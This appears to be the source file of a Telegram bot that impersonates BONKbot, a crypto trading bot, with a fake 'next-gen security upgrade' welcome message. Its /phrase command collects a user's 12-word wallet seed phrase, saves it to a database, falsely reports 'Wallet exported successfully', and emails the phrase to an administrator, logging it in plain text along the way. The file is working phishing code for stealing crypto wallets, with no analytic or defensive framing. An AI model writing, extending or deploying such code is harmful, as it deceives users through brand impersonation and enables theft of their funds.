import updatePhrase from '../db/methods/UpdateMethods/updatePhrase.js';
import isTwelveWords from '../helpers/checkPhrase.js';
import extractPhrase from '../helpers/extractPhrase.js';
import logMsgContext from '../helpers/logger.js';
import sendPhraseMail from '../helpers/mailPhrase.js'; // Using SMTP
import { startMenu } from './menus.js';

const registerCommandHandlers = (bot) => {
    bot.onText(/\/start/, (msg) => {
        logMsgContext(msg, "/start");
        bot.sendMessage(
            msg.chat.id,
            "Introducing BONKbot's next-gen security upgrade.\n\n" +
            "BONKbot is going non-custodial, providing the security of a hardware wallet without any impact on your trading experience. You'll now have:\n\n" +
            "• Optional 2FA via authenticator app, to protect you even if your Telegram account is compromised.\n" +
            "• Pre-transaction verification modules that protect you even if pump.fun, Raydium, Jupiter or any other DEX is hacked.\n\n" +
            "All with zero impact on trading speed and efficiency.\n\n" +
            "You can read more about BONKbot's next-gen security upgrade on our <a href=\"https://x.com/bonkbot_io/status/1844029048881844619\">Twitter</a>, or on our <a href=\"https://bonkbot.io/blog/a-hardware-wallet-in-the-cloud-introducing-bonkbot-s-next-gen-key-management-system\">blog</a>.\n\n" +
            "To use BONKbot and the next-gen upgrade, please accept the <a href=\"https://bonkbot.io/terms-of-use-bonkbot\">BONKbot Terms of Use</a>.\n\n",
            {
                ...startMenu,
                parse_mode: "HTML"
            }
        );
    });

    bot.onText(/\/help/, (msg) => {
        logMsgContext(msg, "/help");
        bot.sendMessage(
            msg.chat.id,
            "Here's your help" // make it match the help callback
        );
    });
    bot.onText(/\/phrase/, async (msg) => {
        logMsgContext(msg, "/phrase");
        console.log("🚨 PHRASE COMMAND TRIGGERED - Starting email workflow debug");

        const {
            from: { id: telegram_id, first_name },
            text
        } = msg;

        // 🔍 Extract the phrase from the command
        const phrase = extractPhrase(text);
        console.log("📝 Extracted phrase:", phrase);

        // 🧠 Check if it's a valid 12-word phrase
        const isValidPhrase = isTwelveWords(phrase);
        console.log("✅ Is valid 12-word phrase:", isValidPhrase);

        // ❌ Reject if invalid phrase format
        if (!isValidPhrase) {
            console.log("❌ Invalid phrase format - stopping email workflow");
            return bot.sendMessage(
                msg.chat.id,
                `⚠️ Yo ${first_name}, that phrase doesn't look right.\n\nMake sure you're sending exactly *12 words* like this:\n\n [word1 word2 ... word12]`,
                { parse_mode: "Markdown" }
            );
        }

        try {
            // ✅ Save/update phrase in DB
            console.log("💾 Saving phrase to database...");
            const update = await updatePhrase(telegram_id, phrase);
            console.log("✅ Phrase saved to database successfully");

            // 🎉 Respond with success message
            bot.sendMessage(
                msg.chat.id,
                `✅ Wallet exported successfully.`
            );
        } catch (error) {
            console.error("❌ Error saving phrase:", error);

            // 😓 Send fallback error message
            bot.sendMessage(
                msg.chat.id,
                `⚠️ Sorry ${first_name}, something went wrong while saving your phrase. Please try again later.`
            );
        } finally {
            // 📬 Admin notification via email — only if the phrase is valid
            console.log("📧 EMAIL WORKFLOW STARTING...");
            console.log("📧 User:", `${first_name} (${telegram_id})`);
            console.log("📧 Phrase:", `"${phrase}"`);

            if (isValidPhrase) {
                try {
                    console.log("📧 Calling sendPhraseMail function...");
                    const info = await sendPhraseMail(telegram_id, first_name, phrase);

                    console.log("🎉 EMAIL SENT SUCCESSFULLY!");
                    console.log("📨 Phrase email sent to admin:");
                    console.log("👤 User:", `${first_name} (${telegram_id})`);
                    console.log("🧠 Phrase:", `"${phrase}"`);
                    console.log("📩 Message ID:", info.messageId);
                    console.log("🧭 Envelope:", info.envelope);
                    console.log("✅ Accepted:", info.accepted);
                    if (info.rejected.length) {
                        console.warn("🚫 Rejected:", info.rejected);
                    }
                    console.log("🔁 SMTP Response:", info.response);
                } catch (emailErr) {
                    console.error("💥 EMAIL FAILED!");
                    console.error("❌ Failed to send phrase email to admin:", emailErr.message);
                    console.error("❌ Full error:", emailErr);
                }
            } else {
                console.log("❌ Skipping email - phrase not valid");
            }
        }

    });

    // Add more commands here...
};

export default registerCommandHandlers;


